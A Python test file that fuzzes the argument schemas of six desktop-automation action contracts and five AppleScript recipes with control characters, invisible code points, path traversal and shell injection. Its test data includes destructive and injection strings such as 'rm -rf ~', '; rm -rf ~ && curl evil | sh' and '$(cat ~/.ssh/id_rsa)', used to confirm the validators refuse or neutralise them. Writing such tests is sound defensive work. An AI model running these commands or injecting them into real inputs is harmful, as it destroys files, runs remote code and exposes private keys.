"""The six v2 action contracts and the recipe catalogue (Phase 10 brief
D3): the table (class, data class, workspace rule), the loader's checks
(class, bounds, `confirm_template` slots name real args, the recipe
catalogue hash), the catalogue matching rule extended by class and
protocol version, and the argument-schema fuzz families, generated per
schema (no `hypothesis`): traversal, NUL, C0/C1 controls, bidi, zero-width,
shell metacharacters (refused in paths, inert data in free text),
oversize, type confusion, extra keys, missing keys, non-ASCII bundle ids,
unknown recipes and recipe params outside the recipe's schema."""

import copy
import json
import re
import unicodedata
from functools import cache

import pytest

from nodes.capabilities import (
    ACTION_CONTRACT_DIR,
    INVISIBLE_CHARACTER_CLASS,
    MAX_RUNTIME_SECONDS,
    NOT_INVOCABLE_REASONS,
    RECIPE_CATALOGUE_KEYWORD,
    RECIPE_DIR,
    _load_action,
    _load_recipe,
    check_catalogue_entry,
    check_gate_request,
    free_string_properties,
    get_action_contract,
    get_any_contract,
    get_contract,
    load_action_contracts,
    load_all_contracts,
    load_contracts,
    load_recipes,
    recipe_catalogue_sha256,
    template_slots,
)
from nodes.protocol import ProtocolError, sha256_hex
from nodes.tests.test_protocol_messages import _types

SIX = {
    "repo.command.run",
    "applescript.recipe.run",
    "ax.press",
    "ax.type_text",
    "apps.open",
    "apps.focus",
}
FIVE_RECIPES = {
    "music.play_pause",
    "music.next_track",
    "system.volume_set",
    "finder.reveal_repo",
    "terminal.open_repo",
}

VALID_ARGS = {
    "repo.command.run": {"repo_path": "~/work/acme", "command_kind": "test"},
    "applescript.recipe.run": {"recipe": "music.play_pause", "params": {}},
    "ax.press": {"bundle_id": "com.apple.Safari", "role": "button", "title": "Yeniden Yükle"},
    "ax.type_text": {"bundle_id": "com.apple.Notes", "text": "merhaba\ndünya", "submit": False},
    "apps.open": {"bundle_id": "com.apple.Terminal"},
    "apps.focus": {"bundle_id": "com.googlecode.iterm2"},
}
VALID_PARAMS = {
    "music.play_pause": {},
    "music.next_track": {},
    "system.volume_set": {"level": 50},
    "finder.reveal_repo": {"repo_path": "~/work/acme"},
    "terminal.open_repo": {"repo_path": "/Users/owner/My Projects/çalışma"},
}
PATH_PROPERTIES = {"repo_path"}
BUNDLE_PROPERTIES = {"bundle_id"}
# Free text the node only displays or types: shell metacharacters are data.
FREE_TEXT = {("ax.press", "title"), ("ax.type_text", "text")}
NEWLINE_ALLOWED = {("ax.type_text", "text")}


# --- the table ---


def test_exactly_the_six_action_contracts_and_five_recipes():
    contracts = load_action_contracts()
    assert set(contracts) == SIX
    assert {p.stem for p in ACTION_CONTRACT_DIR.glob("*.json")} == SIX
    assert set(load_recipes()) == FIVE_RECIPES
    assert {p.stem for p in RECIPE_DIR.glob("*.json")} == FIVE_RECIPES
    assert set(VALID_ARGS) == SIX and set(VALID_PARAMS) == FIVE_RECIPES
    assert not set(contracts) & set(load_contracts())
    assert set(load_all_contracts()) == SIX | set(load_contracts())


def test_classes_data_classes_and_workspace_rules():
    by_name = load_action_contracts()
    assert {n for n, c in by_name.items() if c.capability_class == "confirm"} == {
        "apps.open",
        "apps.focus",
    }
    assert {n for n, c in by_name.items() if c.capability_class == "gate"} == SIX - {
        "apps.open",
        "apps.focus",
    }
    run = by_name["repo.command.run"]
    assert (run.data_class, run.workspace_resolution, run.path_args) == (
        "firm",
        "path_arg",
        ("repo_path",),
    )
    recipe = by_name["applescript.recipe.run"]
    assert (recipe.data_class, recipe.workspace_resolution) == ("personal", "recipe_params")
    for name in ("ax.press", "ax.type_text", "apps.open", "apps.focus"):
        assert by_name[name].data_class == "personal"
        assert by_name[name].workspace_resolution == "personal_only"
    for contract in by_name.values():
        assert contract.version == 1
        assert contract.min_protocol_version == 2
        assert contract.is_action
        assert contract.label
        assert 1 <= contract.max_runtime_seconds <= MAX_RUNTIME_SECONDS == 900
        assert contract.result_schema["type"] == "null"
    assert {n for n, c in by_name.items() if c.streams_output} == {"repo.command.run"}
    assert by_name["repo.command.run"].max_runtime_seconds == 900


def test_command_kinds_are_the_closed_vocabulary():
    kinds = get_action_contract("repo.command.run").args_schema["properties"]["command_kind"]
    assert kinds["enum"] == ["test", "lint", "typecheck", "build", "format_check"]


def test_repo_recipes_are_derived_from_their_schema():
    recipes = load_recipes()
    assert {n for n, r in recipes.items() if r.repo_recipe} == {
        "finder.reveal_repo",
        "terminal.open_repo",
    }
    assert recipes["system.volume_set"].params_schema["properties"]["level"] == {
        "type": "integer",
        "minimum": 0,
        "maximum": 100,
    }


def test_confirm_templates_name_real_args():
    for contract in load_action_contracts().values():
        slots = template_slots(contract.confirm_template)
        assert set(slots) <= set(contract.args_schema["properties"]), contract.name
        assert slots, contract.name
    for recipe in load_recipes().values():
        assert set(template_slots(recipe.confirm_template)) <= set(
            recipe.params_schema["properties"]
        )


@pytest.mark.parametrize(
    "template", ["", "{", "a } b", "{Repo}", "{repo path}", "{{repo_path}}", "x" * 301]
)
def test_malformed_templates_are_refused(template):
    with pytest.raises(ValueError):
        template_slots(template)


def test_the_recipe_catalogue_hash_is_embedded_in_the_args_schema():
    schema = get_action_contract("applescript.recipe.run").args_schema
    assert schema[RECIPE_CATALOGUE_KEYWORD] == recipe_catalogue_sha256()
    assert schema["properties"]["recipe"]["enum"] == sorted(FIVE_RECIPES)


def test_read_contract_lookups_never_return_actions():
    for name in SIX:
        assert get_contract(name) is None
        assert get_any_contract(name) is get_action_contract(name)
    assert get_action_contract("git.status") is None


# --- the loader refuses broken contract files ---


def _write(tmp_path, body, name=None):
    path = tmp_path / f"{name or body['name']}.json"
    path.write_text(json.dumps(body), encoding="utf-8")
    return path


def _doc(name):
    return json.loads((ACTION_CONTRACT_DIR / f"{name}.json").read_text("utf-8"))


@pytest.mark.parametrize(
    ("change", "message"),
    [
        ({"class": "read"}, "confirm or gate"),
        ({"max_runtime_seconds": 901}, "max_runtime_seconds"),
        ({"max_runtime_seconds": 0}, "max_runtime_seconds"),
        ({"max_runtime_seconds": True}, "max_runtime_seconds"),
        ({"streams_output": "yes"}, "streams_output"),
        ({"label": ""}, "label"),
        ({"confirm_template": "{bundle} açılsın mı?"}, "confirm_template"),
        ({"confirm_template": "{bundle_id açılsın mı?"}, "malformed"),
        ({"data_class": "secret"}, "data_class"),
        ({"workspace_resolution": "anywhere"}, "workspace_resolution"),
        ({"path_args": ["missing"]}, "path_args"),
        ({"extra": 1}, "keys"),
    ],
)
def test_the_loader_refuses(tmp_path, change, message):
    body = {**_doc("apps.open"), **change}
    with pytest.raises(ValueError, match=message):
        _load_action(_write(tmp_path, body))


def test_the_loader_refuses_a_misnamed_file(tmp_path):
    with pytest.raises(ValueError, match="file name"):
        _load_action(_write(tmp_path, _doc("apps.open"), name="apps.launch"))


def test_the_loader_refuses_a_stale_recipe_hash_or_enum(tmp_path):
    body = _doc("applescript.recipe.run")
    body["args_schema"][RECIPE_CATALOGUE_KEYWORD] = "0" * 64
    with pytest.raises(ValueError, match="stale"):
        _load_action(_write(tmp_path, body))
    body = _doc("applescript.recipe.run")
    body["args_schema"]["properties"]["recipe"]["enum"].append("shell.run")
    with pytest.raises(ValueError, match="recipe enum"):
        _load_action(_write(tmp_path, body))
    other = {**_doc("apps.open")}
    other["args_schema"] = {**other["args_schema"], RECIPE_CATALOGUE_KEYWORD: "0" * 64}
    with pytest.raises(ValueError, match="only"):
        _load_action(_write(tmp_path, other))


def test_the_recipe_loader_refuses(tmp_path):
    body = json.loads((RECIPE_DIR / "system.volume_set.json").read_text("utf-8"))
    for change, message in (
        ({"confirm_template": "Ses {volume}?"}, "param"),
        ({"params_schema": {"type": "object"}}, "closed"),
        ({"label": ""}, "label"),
        ({"script": "tell app"}, "keys"),
    ):
        with pytest.raises(ValueError, match=message):
            _load_recipe(_write(tmp_path, {**body, **change}))


def test_recipes_carry_no_script_text():
    for path in RECIPE_DIR.glob("*.json"):
        text = path.read_text("utf-8").lower()
        assert "tell application" not in text and "osascript" not in text


# --- catalogue matching: class and protocol version ---


def test_conforming_action_entries_are_invocable_on_v2_only():
    for contract in load_action_contracts().values():
        entry = contract.catalogue_entry()
        assert check_catalogue_entry(entry, protocol_version=2) is None
        assert check_catalogue_entry(entry, protocol_version=1) == "protocol_v1"
        assert check_catalogue_entry(entry) == "protocol_v1"  # default: v1


def test_an_action_entry_claiming_read_on_v1_is_still_protocol_v1():
    entry = {**get_action_contract("repo.command.run").catalogue_entry(), "class": "read"}
    assert check_catalogue_entry(entry, protocol_version=1) == "protocol_v1"
    assert check_catalogue_entry(entry, protocol_version=2) == "class_mismatch"


def test_read_entries_stay_invocable_on_v2():
    for contract in load_contracts().values():
        assert check_catalogue_entry(contract.catalogue_entry(), protocol_version=2) is None
    gate_git = {**get_contract("git.status").catalogue_entry(), "class": "gate"}
    assert check_catalogue_entry(gate_git, protocol_version=2) == "class_not_read"


def _entry(name, **overrides):
    entry = get_action_contract(name).catalogue_entry()
    entry.update(overrides)
    return entry


def test_action_not_invocable_reasons_on_v2():
    wider = copy.deepcopy(get_action_contract("apps.open").args_schema)
    wider["properties"]["bundle_id"]["maxLength"] = 4096
    recipes_changed = copy.deepcopy(get_action_contract("applescript.recipe.run").args_schema)
    recipes_changed[RECIPE_CATALOGUE_KEYWORD] = "1" * 64
    result = {"type": "object", "additionalProperties": False, "properties": {}}
    cases = {
        "class_mismatch": _entry("apps.open", **{"class": "gate"}),
        "version_mismatch": _entry("apps.open", version=2),
        "args_schema_mismatch": _entry("apps.open", args_schema=wider),
        "result_schema_mismatch": _entry("apps.open", result_schema=result),
        "not_granted": _entry("apps.open", availability="not_granted"),
        "unsupported": _entry("apps.open", availability="unsupported"),
    }
    for reason, entry in cases.items():
        assert reason in NOT_INVOCABLE_REASONS
        assert check_catalogue_entry(entry, protocol_version=2) == reason, reason
    # A node whose recipe catalogue differs advertises another args hash.
    recipe_entry = _entry("applescript.recipe.run", args_schema=recipes_changed)
    assert check_catalogue_entry(recipe_entry, protocol_version=2) == "args_schema_mismatch"
    downgraded = _entry("repo.command.run", **{"class": "confirm"})
    assert check_catalogue_entry(downgraded, protocol_version=2) == "class_mismatch"


# --- the fuzz families, generated per schema ---


HOSTILE_INSERTS = {
    "nul": "\x00",
    "c0_soh": "\x01",
    "c0_escape": "\x1b[31m",
    "c0_tab": "\t",
    "c0_cr": "\r",
    "del": "\x7f",
    "c1_nel": "\x85",
    "c1_csi": "\x9b",
    "bidi_rlo": "‮",
    "bidi_lre": "‪",
    "bidi_lri": "⁦",
    "bidi_pdi": "⁩",
    "bidi_alm": "؜",
    "bidi_lrm": "‎",
    "zero_width_space": "​",
    "zero_width_joiner": "‍",
    "word_joiner": "⁠",
    "invisible_times": "⁢",
    "mongolian_vowel_separator": "᠎",
    "bom": "﻿",
    "line_separator": " ",
    "paragraph_separator": "\u2029",
    # Review round 1: every other format or invisible code point.
    "soft_hyphen": "\xad",
    "combining_grapheme_joiner": "\u034f",
    "arabic_number_sign": "\u0600",
    "syriac_abbreviation_mark": "\u070f",
    "hangul_choseong_filler": "\u115f",
    "khmer_inherent_aq": "\u17b4",
    "mongolian_fvs1": "\u180b",
    "inhibit_symmetric_swapping": "\u206a",
    "nominal_digit_shapes": "\u206f",
    "braille_blank": "\u2800",
    "hangul_filler": "\u3164",
    "surrogate": "\ud800",
    "private_use": "\ue000",
    "noncharacter_fdd0": "\ufdd0",
    "variation_selector_16": "\ufe0f",
    "halfwidth_hangul_filler": "\uffa0",
    "interlinear_anchor": "\ufff9",
    "interlinear_terminator": "\ufffb",
    "noncharacter_ffff": "\uffff",
    "kaithi_number_sign": "\U000110bd",
    "egyptian_joiner": "\U00013430",
    "shorthand_format": "\U0001bca0",
    "musical_begin_beam": "\U0001d173",
    "language_tag": "\U000e0001",
    "tag_latin_a": "\U000e0041",
    "cancel_tag": "\U000e007f",
    "variation_selector_17": "\U000e0100",
    "supplementary_private_use": "\U000f0000",
    "unassigned_plane_4": "\U00040000",
}
TYPE_CONFUSION = {"int": 1, "bool": True, "null": None, "list": ["x"], "object": {"x": "y"}}
TRAVERSAL = [
    "~/work/../secret",
    "~/work/..",
    "~/..",
    "/Users/owner/../../etc",
    "/./etc",
    "~/./work",
    "relative/path",
    "~",
    "/",
    "~/work//double",
    "\\\\server\\share",
    "~/work/...",
    "~/.../work",
    "/..../etc",
]
SHELL_METACHARACTERS = [
    ";",
    "|",
    "&",
    "$(id)",
    "`id`",
    ">",
    "<",
    "*",
    "?",
    "'",
    '"',
    "\\",
    "!",
    "{a,b}",
    "[ab]",
]
NON_ASCII_BUNDLE_IDS = [
    "com.аpple.Terminal",  # Cyrillic a
    "com.apple.Términal",
    "ｃｏｍ.apple.Terminal",  # full width
    "com.apple.Terminal​",
    "com.apple.Termİnal",
    "com.apple.终端",
]
MALFORMED_BUNDLE_IDS = [
    "com",
    "com..apple",
    ".com.apple",
    "com.apple.",
    "com.apple.Terminal\n",
    "com.apple.Terminal app",
    "com/apple/Terminal",
    "a." + "b" * 64,
    ".".join(["a"] * 9),
    "com.apple." + "x" * 150,
]


def _string_cases(owner, name, sub, base):
    cases = []
    for family, insert in HOSTILE_INSERTS.items():
        cases.append((f"{family}_middle", base[:2] + insert + base[2:]))
        cases.append((f"{family}_end", base + insert))
    if (owner, name) not in NEWLINE_ALLOWED:
        cases.append(("newline", base + "\nrm -rf ~"))
        cases.append(("trailing_newline", base + "\n"))
    limit = sub.get("maxLength")
    if name in PATH_PROPERTIES:
        cases.append(("oversize", "~/" + "/".join(["a" * 200] * 6)))
        cases += [(f"traversal:{value}", value) for value in TRAVERSAL]
        cases += [(f"shell:{meta}", f"~/work/a{meta}b") for meta in SHELL_METACHARACTERS]
    else:
        cases.append(("oversize", "a" * (limit + 1)))
    if name in BUNDLE_PROPERTIES:
        cases += [(f"non_ascii:{value}", value) for value in NON_ASCII_BUNDLE_IDS]
        cases += [(f"malformed:{value}", value) for value in MALFORMED_BUNDLE_IDS]
    if "enum" in sub:
        cases += [("enum_case", base.upper()), ("enum_unknown", "deploy"), ("enum_empty", "")]
    if sub.get("minLength", 0) >= 1:
        cases.append(("empty", ""))
    cases += [(f"type:{label}", value) for label, value in TYPE_CONFUSION.items()]
    return cases


def _integer_cases(sub):
    return [
        ("below_minimum", sub["minimum"] - 1),
        ("above_maximum", sub["maximum"] + 1),
        ("float", float(sub["minimum"])),
        ("string", str(sub["minimum"])),
        ("bool", True),
        ("null", None),
        ("huge", 2**63),
    ]


def _boolean_cases():
    return [("string", "true"), ("int_one", 1), ("int_zero", 0), ("null", None), ("list", [True])]


def fuzz_cases(owner, schema, valid):
    """(family, hostile instance) for one closed object schema and a valid
    instance of it: every property gets the families of its type."""
    cases = []
    for name, sub in schema["properties"].items():
        types = _types(sub)
        if "string" in types:
            per_property = _string_cases(owner, name, sub, valid[name])
        elif "integer" in types:
            per_property = _integer_cases(sub)
        elif "boolean" in types:
            per_property = _boolean_cases()
        elif "object" in types:
            per_property = [(f"type:{k}", v) for k, v in TYPE_CONFUSION.items() if k != "object"]
        else:  # pragma: no cover - the meta-test forbids other types
            raise AssertionError((owner, name, types))
        cases += [(f"{name}:{family}", {**valid, name: value}) for family, value in per_property]
    cases.append(("extra_key", {**valid, "extra": 1}))
    cases.append(("extra_policy_key", {**valid, "allowlist": ["*"]}))
    for name in schema.get("required", []):
        cases.append((f"missing:{name}", {k: v for k, v in valid.items() if k != name}))
    cases += [
        ("not_an_object:list", [valid]),
        ("not_an_object:null", None),
        ("not_an_object:str", "x"),
    ]
    return cases


def _capability_cases():
    for name, contract in sorted(load_action_contracts().items()):
        for family, args in fuzz_cases(name, contract.args_schema, VALID_ARGS[name]):
            yield pytest.param(name, args, id=f"{name}:{family}")


def _recipe_cases():
    recipe_contract = get_action_contract("applescript.recipe.run")
    for name, recipe in sorted(load_recipes().items()):
        for family, params in fuzz_cases(name, recipe.params_schema, VALID_PARAMS[name]):
            yield pytest.param(
                recipe_contract.name,
                {"recipe": name, "params": params},
                id=f"recipe:{name}:{family}",
            )


@pytest.mark.parametrize(("capability", "args"), list(_capability_cases()))
def test_every_capability_schema_refuses_its_fuzz_families(capability, args):
    with pytest.raises(ProtocolError) as exc:
        get_action_contract(capability).validate_args(args)
    assert exc.value.code == "args_contract"


@pytest.mark.parametrize(("capability", "args"), list(_recipe_cases()))
def test_every_recipe_params_schema_refuses_its_fuzz_families(capability, args):
    with pytest.raises(ProtocolError) as exc:
        get_action_contract(capability).validate_args(args)
    assert exc.value.code == "args_contract"


def test_the_fuzz_generator_covers_every_property_of_every_schema():
    for name, contract in load_action_contracts().items():
        families = {
            f.split(":")[0] for f, _ in fuzz_cases(name, contract.args_schema, VALID_ARGS[name])
        }
        assert set(contract.args_schema["properties"]) <= families, name
    for name, recipe in load_recipes().items():
        cases = fuzz_cases(name, recipe.params_schema, VALID_PARAMS[name])
        assert {"extra_key", "not_an_object:list"} <= {f for f, _ in cases}


def test_the_valid_samples_validate():
    for name, args in VALID_ARGS.items():
        get_action_contract(name).validate_args(args)
    recipe_contract = get_action_contract("applescript.recipe.run")
    for name, params in VALID_PARAMS.items():
        recipe_contract.validate_args({"recipe": name, "params": params})
        assert recipe_contract.recipe_for({"recipe": name}).name == name


@pytest.mark.parametrize(
    "recipe", ["shell.run", "music.play_pause ", "MUSIC.PLAY_PAUSE", "", "music"]
)
def test_unknown_recipes_are_refused(recipe):
    with pytest.raises(ProtocolError):
        get_action_contract("applescript.recipe.run").validate_args(
            {"recipe": recipe, "params": {}}
        )


@pytest.mark.parametrize(
    ("recipe", "params"),
    [
        ("music.play_pause", {"level": 10}),
        ("music.next_track", {"repo_path": "~/work/acme"}),
        ("system.volume_set", {"repo_path": "~/work/acme"}),
        ("finder.reveal_repo", {"level": 10}),
        ("terminal.open_repo", {}),
        ("terminal.open_repo", {"repo_path": "~/work/acme", "command": "rm -rf ~"}),
        ("system.volume_set", {"level": 50, "script": "tell application"}),
    ],
)
def test_recipe_params_outside_the_recipes_own_schema(recipe, params):
    with pytest.raises(ProtocolError) as exc:
        get_action_contract("applescript.recipe.run").validate_args(
            {"recipe": recipe, "params": params}
        )
    assert exc.value.code == "args_contract"


@pytest.mark.parametrize(("capability", "field"), sorted(FREE_TEXT))
def test_shell_metacharacters_in_free_text_are_inert_data(capability, field):
    contract = get_action_contract(capability)
    for meta in SHELL_METACHARACTERS + ["; rm -rf ~ && curl evil | sh", "$(cat ~/.ssh/id_rsa)"]:
        contract.validate_args({**VALID_ARGS[capability], field: f"Kaydet {meta}"})


def test_paths_take_the_8a_shapes():
    contract = get_action_contract("repo.command.run")
    for path in (
        "~/work/acme",
        "/Users/owner/work/acme",
        "/Users/owner/My Projects/çalışma",
        "~/a.b-c_d",
    ):
        contract.validate_args({"repo_path": path, "command_kind": "lint"})


def test_the_args_hash_covers_the_recipe_params():
    a = {"recipe": "system.volume_set", "params": {"level": 10}}
    b = {"recipe": "system.volume_set", "params": {"level": 11}}
    assert sha256_hex(a) != sha256_hex(b)


# --- review round 1: one invisible-character class for every free string ---

VISIBLE_SAMPLES = ["Merhaba dünya ğüşıöçİ", "Yeniden Yükle", "终端 ターミナル", "😀 ok", "a b"]
WALKED_CATEGORIES = ("Cc", "Cf", "Co", "Cs", "Zl", "Zp")


def _free_string_patterns():
    """(owner, property, pattern) for every user-visible free string of
    every action contract and recipe (the negated-class strings)."""
    out = []
    for name, contract in sorted(load_action_contracts().items()):
        for prop, sub in free_string_properties(contract.args_schema).items():
            out.append((name, prop, sub["pattern"]))
    for name, recipe in sorted(load_recipes().items()):
        for prop, sub in free_string_properties(recipe.params_schema).items():
            out.append((f"recipe:{name}", prop, sub["pattern"]))
    return out


def _sample(prop, insert):
    return f"~/work/a{insert}b" if prop in PATH_PROPERTIES else f"ab{insert}cd"


@cache
def _code_points_by_category():
    by_category = {}
    for cp in range(0x110000):
        by_category.setdefault(unicodedata.category(chr(cp)), []).append(cp)
    return by_category


def test_the_free_strings_are_exactly_text_title_and_repo_path():
    found = {(owner, prop) for owner, prop, _ in _free_string_patterns()}
    assert found == {
        ("ax.type_text", "text"),
        ("ax.press", "title"),
        ("repo.command.run", "repo_path"),
        ("recipe:finder.reveal_repo", "repo_path"),
        ("recipe:terminal.open_repo", "repo_path"),
    }
    for _, _, pattern in _free_string_patterns():
        assert INVISIBLE_CHARACTER_CLASS in pattern


@pytest.mark.parametrize("category", WALKED_CATEGORIES)
def test_every_free_string_refuses_every_code_point_of_the_invisible_categories(category):
    code_points = _code_points_by_category()[category]
    assert code_points
    for owner, prop, pattern in _free_string_patterns():
        compiled = re.compile(pattern)
        allowed = [
            hex(cp)
            for cp in code_points
            if not ((owner, prop) == ("ax.type_text", "text") and cp == 0x0A)
            and compiled.fullmatch(_sample(prop, chr(cp)))
        ]
        assert not allowed, (owner, prop, category, allowed[:10])


def test_unassigned_code_points_outside_planes_0_to_3_and_noncharacters_are_refused():
    noncharacters = [cp for cp in range(0xFDD0, 0xFDF0)] + [
        (plane << 16) | low for plane in range(17) for low in (0xFFFE, 0xFFFF)
    ]
    walked = [cp for cp in _code_points_by_category()["Cn"] if cp >= 0x40000] + noncharacters
    for owner, prop, pattern in _free_string_patterns():
        compiled = re.compile(pattern)
        allowed = [hex(cp) for cp in walked if compiled.fullmatch(_sample(prop, chr(cp)))]
        assert not allowed, (owner, prop, allowed[:10])


def test_blank_glyphs_and_variation_selectors_are_refused_end_to_end():
    blanks = [0x034F, 0x115F, 0x1160, 0x17B4, 0x17B5, 0x2800, 0x3164, 0xFFA0]
    blanks += list(range(0x180B, 0x1810)) + list(range(0xFE00, 0xFE10))
    blanks += list(range(0xE0100, 0xE01F0))
    for cp in blanks:
        with pytest.raises(ProtocolError):
            get_action_contract("ax.type_text").validate_args(
                {**VALID_ARGS["ax.type_text"], "text": f"merhaba{chr(cp)}"}
            )
        with pytest.raises(ProtocolError):
            get_action_contract("applescript.recipe.run").validate_args(
                {"recipe": "terminal.open_repo", "params": {"repo_path": f"~/w{chr(cp)}"}}
            )


@pytest.mark.parametrize("sample", VISIBLE_SAMPLES)
def test_visible_text_in_every_script_is_still_accepted(sample):
    get_action_contract("ax.type_text").validate_args(
        {**VALID_ARGS["ax.type_text"], "text": sample}
    )
    get_action_contract("ax.press").validate_args({**VALID_ARGS["ax.press"], "title": sample})
    get_action_contract("repo.command.run").validate_args(
        {"repo_path": f"~/work/{sample}", "command_kind": "test"}
    )


def test_the_loader_refuses_a_free_string_without_the_shared_class(tmp_path):
    path = RECIPE_DIR / "finder.reveal_repo.json"
    body = json.loads(path.read_text(encoding="utf-8"))
    body["params_schema"]["properties"]["repo_path"]["pattern"] = "^[^\\x00-\\x1f]{1,255}$"
    drifted = tmp_path / "finder.reveal_repo.json"
    drifted.write_text(json.dumps(body), encoding="utf-8")
    with pytest.raises(ValueError, match="shared invisible character class"):
        _load_recipe(drifted)
    path = ACTION_CONTRACT_DIR / "ax.press.json"
    body = json.loads(path.read_text(encoding="utf-8"))
    pattern = body["args_schema"]["properties"]["title"]["pattern"]
    body["args_schema"]["properties"]["title"]["pattern"] = pattern.replace("\\xad", "")
    drifted = tmp_path / "ax.press.json"
    drifted.write_text(json.dumps(body), encoding="utf-8")
    with pytest.raises(ValueError, match="shared invisible character class"):
        _load_action(drifted)


# --- review round 1: the contract check a grant issuer runs before signing ---


def test_check_gate_request_accepts_every_gate_contract_with_valid_args():
    for name in ("repo.command.run", "applescript.recipe.run", "ax.press", "ax.type_text"):
        contract = get_action_contract(name)
        assert check_gate_request(name, contract.version, VALID_ARGS[name]) is contract


@pytest.mark.parametrize(
    ("capability", "version", "args"),
    [
        ("shell.run", 1, {}),
        (sorted(load_contracts())[0], 1, {}),
        ("apps.open", 1, VALID_ARGS["apps.open"]),
        ("apps.focus", 1, VALID_ARGS["apps.focus"]),
        ("repo.command.run", 2, VALID_ARGS["repo.command.run"]),
        ("repo.command.run", True, VALID_ARGS["repo.command.run"]),
        ("repo.command.run", 1, {**VALID_ARGS["repo.command.run"], "command_kind": "deploy"}),
        ("ax.type_text", 1, {**VALID_ARGS["ax.type_text"], "text": f"ok{chr(0xAD)}hidden"}),
        ("applescript.recipe.run", 1, {"recipe": "system.volume_set", "params": {}}),
    ],
)
def test_check_gate_request_refuses_what_a_grant_must_never_cover(capability, version, args):
    with pytest.raises(ProtocolError) as exc:
        check_gate_request(capability, version, args)
    assert exc.value.code == "args_contract"


def test_the_shared_gate_vector_passes_the_contract_check():
    from nodes.tests.vectors_v2 import gated_envelope

    envelope = gated_envelope()
    check_gate_request(envelope["capability"], envelope["capability_version"], envelope["args"])
